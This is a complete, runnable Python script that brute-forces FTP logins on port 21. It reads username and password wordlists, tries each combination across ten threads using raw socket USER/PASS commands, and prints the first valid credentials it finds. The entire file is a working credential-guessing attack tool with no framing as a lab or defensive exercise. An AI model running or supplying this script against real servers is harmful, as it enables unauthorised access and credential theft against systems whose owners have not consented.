import socket
import threading
from queue import Queue

# Shared variable to signal threads to stop
valid_credentials_found = False
lock = threading.Lock()

def connect_ftp(server, username, password):
    try:
        ftp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ftp_socket.settimeout(5)
        ftp_socket.connect((server, 21))
        response = ftp_socket.recv(1024).decode()

        ftp_socket.send(f"USER {username}\r\n".encode())
        user_response = ftp_socket.recv(1024).decode()

        if "331" in user_response:
            ftp_socket.send(f"PASS {password}\r\n".encode())
            pass_response = ftp_socket.recv(1024).decode()

            if "230" in pass_response:
                ftp_socket.close()
                return True

        ftp_socket.close()
        return False
    except socket.error:
        return False

def worker(server, username, password_list, queue):
    global valid_credentials_found

    while not queue.empty() and not valid_credentials_found:
        password = queue.get()

        # Skip further attempts if valid credentials are found
        with lock:
            if valid_credentials_found:
                queue.task_done()
                break

        if connect_ftp(server, username, password):
            with lock:
                valid_credentials_found = True
            print(f"[+] Valid credentials found: {username}:{password}")
            queue.task_done()
            break

        queue.task_done()

def brute_force_ftp_with_limited_threads(server, username, password_list):
    global valid_credentials_found
    valid_credentials_found = False  # Reset the flag for each username

    queue = Queue()
    for password in password_list:
        queue.put(password)

    threads = []
    for _ in range(10):  # Limit to 10 threads
        thread = threading.Thread(target=worker, args=(server, username, password_list, queue))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def load_wordlist(file_path):
    try:
        with open(file_path, 'r') as file:
            return file.read().splitlines()
    except FileNotFoundError:
        print(f"[-] Wordlist not found: {file_path}")
        return []

if __name__ == "__main__":
    server = input("Enter the target FTP server: ")
    username_file = input("Enter the username wordlist path: ")
    password_file = input("Enter the password wordlist path: ")

    username_list = load_wordlist(username_file)
    password_list = load_wordlist(password_file)

    if not username_list or not password_list:
        print("[-] Wordlists are empty. Exiting...")
    else:
        for username in username_list:
            brute_force_ftp_with_limited_threads(server, username, password_list)

            # Exit if valid credentials are found
            if valid_credentials_found:
                break
